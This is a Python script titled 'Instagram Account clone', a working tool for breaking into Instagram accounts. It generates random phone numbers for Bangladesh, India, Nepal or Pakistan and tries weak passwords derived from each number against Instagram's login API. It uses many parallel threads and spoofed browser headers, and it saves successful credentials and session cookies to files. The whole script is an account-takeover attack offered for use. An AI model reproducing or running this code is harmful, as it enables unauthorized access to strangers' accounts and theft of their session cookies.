"""
Project: Instagram Account clone
Author: Masudur Rahman Sifat (Mr.SxR)
Date Published: 2024-03-18 | Last Modified: 2024-03-18

Description:
This script is an open-source contribution. It took significant time and effort to develop,  
so please give proper credit when using or modifying it.

Note: If you find this useful, consider acknowledging the author. Contributions are welcome!
"""
import os,sys,time,uuid,json,string,random,requests
from concurrent.futures import ThreadPoolExecutor as threadpol
from datetime import datetime 
#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
a = "\033[1;97m";b = "\033[1;92m";c = "\033[1;91m";d = "\033[1;32m";e = "\033[1;37m";ff = "\033[1;96m";g = "\033[1;93m";h = "\033[1;94m";i = "\033[1;95m";j = "\x1b[38;5;208m"
#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
l1 = f"{b}[{c}1{b}]";l2 = f"{b}[{c}2{b}]";l3 = f"{b}[{c}3{b}]";l4 = f"{b}[{c}4{b}]";l5 = f"{b}[{c}5{b}]";l0 = f"{b}[{c}0{b}]";ekl = f"{ff}:{a}"
#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
sxrline = f"{ff}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
#▬▭▬▭▬▭▬▭[ OPEN FOLDER ]▬▭▬▭▬▭▬▭#
try:os.mkdir("/sdcard/Mr.SxR.INSTA-CLONE")
except:pass
#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
cty,numnx,sxr_mthd,cps,oks,loop = [],[],[],[],[],0
sys.stdout.write("\x1b]2; Mr. SxR\x07")
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    os.system("clear")
    print(f"""{b}
      .d8888.  db    db  d8888b. 
      88'  YP  `8b  d8'  88  `8D 
      `8bo.     `8bd8'   88oobY' 
        `Y8b.   .dPYb.   88`8b   
      db   8D  .8P  Y8.  88 `88. 
      `8888Y'  YP    YP  88   YD   {j}V-20
{sxrline}
 {b}[{c}●{b}] DEVELOPER    {ff}:{b} Mr.SxR
 {b}[{c}●{b}] FACEBOOK     {ff}:{b} Masudur Rahman Sifat
 {b}[{c}●{b}] GITHUB       {ff}:{b} github.com/Mr-SxR
 {b}[{c}●{b}] TOOL         {ff}:{b} RANDOM
 {b}[{c}●{b}] TOOL STATUS  {ff}:{b} FREE
{sxrline}""")
#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
def sxr_main():
    clr_logo()
    print(f" {l1} RANDOM CLONE\n {l2} CONTACT ADMIN\n {l0} EXIT TOOL\n{sxrline}")
    chic_opsn = input(f"{b} [{c}●{b}] CHOOSE OPTION {ekl} ")
    if chic_opsn in ["1","01","A","a"]:sxr_random()
    elif chic_opsn in ["2","02","B","b"]:os.system("xdg-open https://www.facebook.com/profile.php?id=100003669903422");sxr_main()
    elif chic_opsn in ["0","00","O","o"]:exit()
    else:print(f"\n{c} You have selected the wrong option..");time.sleep(4);sxr_main()
#▬▭▬▭▬▭▬▭[ RANDOM DEF ]▬▭▬▭▬▭▬▭#
def sxr_random():
    clr_logo();print(f" {l1} BD CLONE\n {l2} INDIA CLONE\n {l3} NEPAL CLONE\n {l4} PAK CLONE\n {l0} BACK MENU\n{sxrline}")
    option = input(f"{b} CHOOSE AN OPTION {ekl} ")
    if option in ["1","01","A","a"]:cty.append('BD')
    elif option in ["2","02","B","b"]:cty.append('IND')
    elif option in ["3","03","C","c"]:cty.append('NPL')
    elif option in ["4","04","D","d"]:cty.append('PAK')
    elif option in ["0","00","O","o"]:sxr_main()
    else:print(f"\n {c}You have selected the wrong option..");time.sleep(3);sxr_random()
    if "BD" in cty:clr_logo();print(f"{b} EXAMPLE {ekl} {b}0171 {ff}- {b}0184 {ff}- {b}0192 {ff}- {b}0163\n{sxrline}")
    elif "IND" in cty:clr_logo();print(f"{b} EXAMPLE {ekl} {b}6390 {ff}- {b}6354 {ff}- {b}9340 {ff}- {b}9229\n{sxrline}")
    elif "NPL" in cty:clr_logo();print(f"{b} EXAMPLE {ekl} {b}9815 {ff}- {b}9814 {ff}- {b}9861 {ff}- {b}9840\n{sxrline}")
    elif "PAK" in cty:clr_logo();print(f"{b} EXAMPLE {ekl} {b}0300 {ff}- {b}0340 {ff}- {b}0320 {ff}- {b}0330\n{sxrline}")
    sim_code = input(f" {b}ENTER SIM CODE {ekl} ")
    clr_logo();print(f"{b} EXAMPLE {ekl} {b}3000 {ff}- {b}5000 {ff}- {b}50000 {ff}- {b}99999\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CRACK LIMIT {ekl} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        if "BD" in cty:numx = ''.join(random.choice(string.digits) for i in range(7))
        elif "IND" in cty:numx = ''.join(random.choice(string.digits) for i in range(6))
        elif "NPL" in cty:numx = ''.join(random.choice(string.digits) for i in range(6))
        elif "PAK" in cty:numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo();print(f" {l1} MATHOD {ff}- {b}1\n{sxrline}")
    #clr_logo();print(f" {l1} MATHOD {ff}- {b}1\n {l2} MATHOD {ff}- {b}2\n {l3} MATHOD {ff}- {b}3\n{sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekl} ")
    if mthd_inn in ["a","A","1","01"]:sxr_mthd.append("A")
    elif mthd_inn in ["b","B","2","02"]:sxr_mthd.append("B")
    elif mthd_inn in ["c","C","3","03"]:sxr_mthd.append("C")
    else:sxr_mthd.append("B")
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo();total_l = len(numnx)
        print(f"{b} SIM CODE {ekl}{b} {sim_code}\n{b} TOTAL LIMIT {ekl} {total_l}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            if "BD" in cty:passlist = [ids[:6],ids[:7],ids[5:11]]
            elif "IND" in cty:passlist = [ids[:6],ids[:7],ids]
            elif "NPL" in cty:passlist = [ids[:6],ids[:7],ids]
            elif "PAK" in cty:passlist = [ids[:6],ids[:7],ids[:8]]
            if "A" in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist)
            #add multiple mathod
            #elif "B" in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist)
            #elif "C" in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist)
    exit(f"\n{sxrline}\n{b} CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{len(oks)}|{c}CP-{len(cps)}\n {b}FILE SAVE AS : /sdcard/Mr.SxR.INSTA-CLONE/\n{sxrline}")
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD-1 ]▬▭▬▭▬▭▬▭#
def rndm1(ids,passlist):   
    try:
        global loop,oks,cps
        for pww in passlist:
            sys.stdout.write(f"\r {a}[{b}SxR-M1{a}] {loop}{b}|OK-{str(len(oks))}  |{c}{str(len(cps))}{b}|");sys.stdout.flush()
            session = requests.Session()
            ins_get = session.get('https://www.instagram.com/accounts/login/')
            csftkn = ins_get.cookies.get('csrftoken')
            time_nw = int(datetime.now().timestamp())
            encpas = f"#PWD_INSTAGRAM_BROWSER:0:{time_nw}:{pww}"
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Safari/537.36"
            _data = {'enc_password': encpas,
                #'caaF2DebugGroup': '0',
                #'loginAttemptsubmissionCount': '0',
                'optIntoOneTap': 'false',
                'queryParams': '{"hl":"en"}',
                'trustedDeviceRecords': '{}',
                'username': ids}
            _header = {'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'x-asbd-id': '129477',
                'x-csrftoken': csftkn,
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '1015820104',
                'x-requested-with': 'XMLHttpRequest'}
            url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
            sxr_respns = requests.post(url,headers=_header,data=_data,allow_redirects=False)
            session_cokie = sxr_respns.cookies.get_dict()
            if sxr_respns.status_code == 200:
                jsn_respns = sxr_respns.json()
                if jsn_respns["authenticated"] == True:
                    coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r [SxR-OK] {ids} | {pww} | {coki}\n")
                    open("/sdcard/Mr.SxR.INSTA-CLONE/SxR-RNDM-OK.txt", "a").write(ids+"|"+pww+"\n")
                    open("/sdcard/Mr.SxR.INSTA-CLONE/SxR-RNDM-OK-COOKIE.txt", "a").write(ids+"|"+pww+"|"+coki+"\n")
                    oks.append(ids)
                    break
                elif "auth_token" in jsn_respns:
                    coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r [SxR-OK] {ids} | {pww} | {coki}\n")
                    open("/sdcard/Mr.SxR.INSTA-CLONE/SxR-RNDM-OK.txt", "a").write(ids+"|"+pww+"\n")
                    open("/sdcard/Mr.SxR.INSTA-CLONE/SxR-RNDM-OK-COOKIE.txt", "a").write(ids+"|"+pww+"|"+coki+"\n")
                    oks.append(ids)
                    break
            elif "sessionid" in session_cokie:
                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f"\r [SxR-OK] {ids} | {pww} | {coki}\n")
                open("/sdcard/Mr.SxR.INSTA-CLONE/SxR-RNDM-OK.txt", "a").write(ids+"|"+pww+"\n")
                open("/sdcard/Mr.SxR.INSTA-CLONE/SxR-RNDM-OK-COOKIE.txt", "a").write(ids+"|"+pww+"|"+coki+"\n")
                oks.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except:pass
#▬▭▬▭▬▭▬▭[ THE END ]▬▭▬▭▬▭▬▭#
sxr_main()
 
